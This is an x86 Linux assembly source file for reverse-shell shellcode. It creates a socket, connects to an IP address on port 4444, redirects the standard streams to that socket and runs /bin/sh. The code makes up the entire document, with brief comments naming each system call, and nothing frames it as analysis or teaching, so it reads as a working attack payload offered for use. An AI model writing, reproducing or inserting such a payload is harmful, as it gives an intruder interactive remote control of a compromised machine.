global _start

section .text

_start:

;    s = socket(AF_INET, SOCK_STREAM, 0);

	xor eax,eax
	xor ebx,ebx
	push ebx
	push 1
	push 2
	
	mov ecx,esp
	mov bl , 1
	mov al , 0x66
	int 0x80

	mov esi,eax

;    connect(s, (struct sockaddr *)&sa, sizeof(sa));

	xor ecx,ecx

	push 0x1010107f ; ip address of 127.16.16.16
	push word 0x5C11
	push word 2
	mov ecx, esp

	push 0x10 ; length of 16
	push ecx
	push esi
	mov ecx,esp

	mov bl,3
	mov al,0x66
	int 0x80

;    dup2(s, 0);
;    dup2(s, 1);
;    dup2(s, 2);

	mov ebx,esi
	xor ecx,ecx
loop:
	mov al,0x3f	;dup2 
	int 0x80
	inc ecx
	cmp ecx,0x2
	jle loop

;    execve("/bin/sh", 0, 0);
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80	
